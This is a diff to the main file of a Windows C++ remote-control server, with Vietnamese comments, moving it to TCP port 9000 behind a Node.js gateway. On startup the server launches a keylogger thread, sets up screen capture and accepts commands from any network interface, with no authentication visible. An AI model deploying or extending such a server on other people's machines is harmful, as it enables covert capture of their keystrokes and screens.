@@ -1,5 +1,6 @@
-// server.cpp (File Main)
+// server.cpp (File Main - TCP Logic Server)
 // Nhiem vu: Khoi tao server, chap nhan ket noi va chuyen cho Router.
+// LANG NGHE TREN CONG 9000
 #define _CRT_SECURE_NO_WARNINGS
 
 #include <winsock2.h>
@@ -11,8 +12,7 @@
 #include <thread>
 #include <vector>
 
-// Bao gom cac file .h moi
-#include "RequestRouter.h"
+#include "CommandRouter.h" // DUNG ROUTER MOI
 #include "controllers/KeylogController.h"
 #include "controllers/DeviceController.h"
 #include "utils/helpers.h"
@@ -29,46 +29,50 @@
 using namespace Gdiplus;
 using namespace std;
 
-// --- HAM MAIN (DIEM KHOI CHAY CHUONG TRINH) ---
 int main()
 {
-    int PORT = 8080;
-    SetConsoleOutputCP(65001);    // Set console de hien thi tieng Viet
-    srand((unsigned int)time(0)); // Khoi tao bo sinh so ngau nhien
+    int TCP_PORT = 9000; // Cong C++ lang nghe
+    int WEB_PORT = 8080; // Cong Gateway (Node.js) ma client se truy cap
 
-    // Khoi tao GDI+ (de chup man hinh)
+    SetConsoleOutputCP(65001);
+    srand((unsigned int)time(0));
+
     GdiplusStartupInput g;
     ULONG_PTR t;
     GdiplusStartup(&t, &g, NULL);
 
-    // Khoi tao Winsock
     WSADATA w;
     WSAStartup(MAKEWORD(2, 2), &w);
 
-    // --- KHOI TAO CAC CONTROLLER TAI NGUYEN CHUNG ---
-    // Bat dau luong keylogger (goi ham static)
+    // Khoi tao cac dich vu (keylogger, quet thiet bi)
     KeylogController::startKeyLoggerThread();
-    // Quet thiet bi ngay khi khoi dong (goi ham static)
     DeviceController::buildDeviceListJson();
 
-    // --- TAO ROUTER ---
-    // Tao 1 instance (doi tuong) cua RequestRouter.
-    // Doi tuong nay se chua instance cua *tat ca* cac controller khac.
-    RequestRouter router;
-
-    // --- KHOI TAO SOCKET ---
     SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
-    sockaddr_in a = {AF_INET, htons(PORT)};
-    a.sin_addr.s_addr = INADDR_ANY; // Lang nghe tren tat ca cac card mang
+    sockaddr_in a = {AF_INET, htons(TCP_PORT)};
+    a.sin_addr.s_addr = INADDR_ANY;
     bind(s, (sockaddr *)&a, sizeof(a));
     listen(s, SOMAXCONN);
 
-    cout << "=== SERVER (REFACTORED OOP) READY ON PORT " << PORT << " ===\n";
-    auto ips = getLocalIPv4Addresses(); // Goi ham tu helpers
-    for (auto &ip : ips)
-        cout << "http://" << ip << ":" << PORT << "/\n";
+    // --- BAT DAU THAY DOI ---
+    cout << "=== LOGIC SERVER (TCP) READY ON PORT " << TCP_PORT << " ===" << endl;
+    cout << "Dang cho Gateway (Node.js) ket noi..." << endl;
 
-    // Vong lap vo han de chap nhan ket noi
+    // Lay va in ra cac dia chi IP LAN
+    cout << "\n-------------------------------------------------" << endl;
+    cout << "May chu Gateway (Node.js) dang chay tai cong: " << WEB_PORT << endl;
+    cout << "Cac thiet bi khac trong mang co the truy cap tai:" << endl;
+
+    // Goi ham tu utils/helpers.h
+    auto ips = getLocalIPv4Addresses();
+    for (auto &ip : ips)
+    {
+        cout << "http://" << ip << ":" << WEB_PORT << endl;
+    }
+    cout << "-------------------------------------------------\n"
+         << endl;
+    // --- KET THUC THAY DOI ---
+
     while (1)
     {
         sockaddr_in ca;
@@ -76,18 +80,18 @@ int main()
         SOCKET c = accept(s, (sockaddr *)&ca, &calen); // Chap nhan ket noi moi
         if (c != INVALID_SOCKET)
         {
-            // Lay dia chi IP cua client de log
             char ip[INET_ADDRSTRLEN];
             inet_ntop(AF_INET, &(ca.sin_addr), ip, INET_ADDRSTRLEN);
             string clientInfo = string(ip) + ":" + to_string(ntohs(ca.sin_port));
 
-            // Tao mot luong moi de xu ly client nay
-            // Goi ham 'handleClient' CUA doi tuong 'router'
-            thread(&RequestRouter::handleClient, &router, c, clientInfo).detach();
+            thread([](SOCKET client, string ip)
+                   {
+                CommandRouter router; 
+                router.handleClient(client, ip); }, c, clientInfo)
+                .detach();
         }
     }
 
-    // Don dep (mac du se khong bao gio chay den day)
     GdiplusShutdown(t);
     WSACleanup();
     closesocket(s);
